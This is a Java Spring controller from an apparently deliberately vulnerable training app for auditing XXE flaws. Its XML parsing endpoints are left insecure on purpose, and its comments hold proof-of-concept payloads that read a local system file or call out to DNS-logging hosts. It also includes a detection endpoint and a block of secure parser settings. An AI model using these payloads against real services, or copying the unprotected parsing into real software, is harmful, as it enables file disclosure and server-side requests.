package com.madaha.codesecone.controller.xxe;

import com.madaha.codesecone.util.SecurityUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.xml.sax.InputSource;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.DefaultHandler;
import org.xml.sax.helpers.XMLReaderFactory;
import org.xmlbeam.annotation.XBRead;

import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.StringReader;

/**
 * 审计的函数
 *   1. XMLReader
 *   2. SAXReader
 *   3. DocumentBuilder
 *   4. XMLStreamReader
 *   5. SAXBuilder
 *   6. SAXParser
 *   7. SAXSource
 *   8. TransformFactory
 *   9. SAXTransformFactory
 *   10. SchemaFactory
 *   11. Unmarshall
 *   12. XPathExpression
 */
@RestController
@RequestMapping("/XXE")
public class XXE {
    Logger log = LoggerFactory.getLogger(XXE.class);

    /**
     * XMLReader
     *
     * @poc http://127.0.0.1:28888/XXE/XMLReader?xxe=
     * payload1：   <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://0g5zvd.dnslog.cn">]><root>&xxe;</root>
     * payload2：   <?xml version="1.0" encoding="utf-8"?> <!DOCTYPE foo [  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><root><name>&xxe;</name></root>
     *
     * 1、起初测试，是能够弹出dnslog的，后来就被我电脑上的oneDNS拦截掉了。
     * 2、每次测试都难以看到现象。由于主机安全终端软件的问题，所以这里仅仅是从大佬哪里copy的代码，并没有做测试。。。
     *
     * @param xxe
     * @return
     */
    @RequestMapping("/XMLReader")
    public String XMLReader(@RequestParam String xxe){
        try{
            log.info("[vul] XMLReader: " + xxe);

            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // 修复：禁用外部实体
            // xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            xmlReader.parse(new InputSource(new StringReader(xxe)));

            return "XMLReader XXE";

        }catch (Exception e){
            return e.toString();
        }
    }


    /**
     * SAXParser：
     *    （1）javax.xml.parsers.SAXParser 是 XMLReader 的替代品，它提供了更多安全的措施，例如默认禁用 DTD 和 外部实体的生命，如果需要使用 DTD 或 外部实体，可以手动启用他们，并使用响应的安全措施。
     *    （2）giaogiao：把oneDNS临时解析禁掉，然后就不报错了，就测试成功了。
     *
     * @poc http://127.0.0.1:28888/XXE/SAXParser?xxe=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3C!DOCTYPE%20test%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fxn666vg.ceye.io%22%3E%5D%3E%3Croot%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Froot%3E
     * @poc_decode http://127.0.0.1:28888/XXE/SAXParser?xxe=<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://xn666vg.ceye.io">]><root><name>&xxe;</name></root>
     *
     * @param xxe
     * @return
     */
    @RequestMapping("/SAXParser")
    public String SAXParser(@RequestParam String xxe){
        try{
            SAXParserFactory factory = SAXParserFactory.newInstance();
            SAXParser parser = factory.newSAXParser();
            parser.parse(new InputSource(new StringReader(xxe)), new DefaultHandler());

            return "SAXParser XXE";
        } catch (Exception e){
            return e.toString();
        }
    }


    @RequestMapping(value = "/xmlbem")
    public String  handleCustomer(@RequestBody Customer customer){
        log.info("[vul] xmlbeam: " + customer);
        return String.format("%s:%s login success!", customer.getFirstname(), customer.getLastname());
    }

    public interface Customer {
        @XBRead("//username")
        String getFirstname();

        @XBRead("//password")
        String getLastname();
    }


    @RequestMapping(value = "/SAXReader")
    public String SAXReader(@RequestParam String content){
        try {

//            SAXReader sax = new SAXReader();
//            // 修复： 禁用外部实体
//            // sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
//
//            // 如果不加以上配置，则存在外部实体注入漏洞问题。
//            sax.read(new InputSource(new StringReader(content)));

            return "SAXReader XXE";
        } catch (Exception e){
            return e.toString();
        }
    }





    






    // .........etc.......



    // safe：检查是否包含 ENTITY 外部实体。
    @RequestMapping("/safe")
    public String check(@RequestParam String content){
        if(!SecurityUtils.checkXXE(content)){
            return "safe";
        } else {
            return "监测到XXE攻击！！";
        }
    }


    /**
     * 安全配置：
     *    （1）通过给解析器设置以下安全配置，来禁用外部实体。
     *    （2）xml_Object就是xml解析类的对象，使用的时候替换该变量名即可。
     *
         // fix code start
         xml_Object.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
         xml_Object.setFeature("http://xml.org/sax/features/external-general-entities", false);
         xml_Object.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
         // fix code end
     *
     */

}
